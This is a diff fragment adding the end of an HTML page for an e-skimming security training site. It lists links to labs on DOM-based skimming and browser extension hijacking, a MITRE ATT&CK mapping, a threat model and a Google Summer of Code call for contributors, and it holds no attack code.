+                    <li><a href="/lab2">Lab 2: DOM-Based Skimming</a> - Advanced DOM manipulation and real-time field
+                        monitoring</li>
+                    <li><a href="/lab3">Lab 3: Browser Extension Hijacking</a> - Privileged API abuse and
+                        extension-based attacks</li>
+                    <li><a href="/mitre-attack">MITRE ATT&CK Matrix</a> - Map e-skimming techniques to the framework
+                    </li>
+                    <li><a href="/threat-model">Interactive Threat Model</a> - Visualize attack vectors</li>
+                </ul>
+
+                <!-- GSoC CTA -->
+                <div class="cta-section" style="margin-top: 60px;">
+                    <h3>Want to Contribute?</h3>
+                    <p>We're participating in <strong>Google Summer of Code</strong>! Help us create new attack labs,
+                        build detection tools, or develop ML-based detection engines.</p>
+                    <div class="cta-buttons">
+                        <a href="https://github.com/pci-tamper-protect/e-skimming-labs/blob/stg/docs/GOOGLE_SUMMER_OF_CODE_IDEAS.md"
+                            class="cta-btn cta-btn-primary" target="_blank">
+                            View GSoC Ideas →
+                        </a>
+                        <a href="https://github.com/pci-tamper-protect/e-skimming-labs"
+                            class="cta-btn cta-btn-secondary" target="_blank">
+                            View on GitHub
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>© 2026 E-Skimming Labs. Part of <a href="https://pcioasis.com">PCI Oasis</a> cybersecurity training
+                platform.</p>
+        </div>
+    </footer>
+</body>
+
+</html>
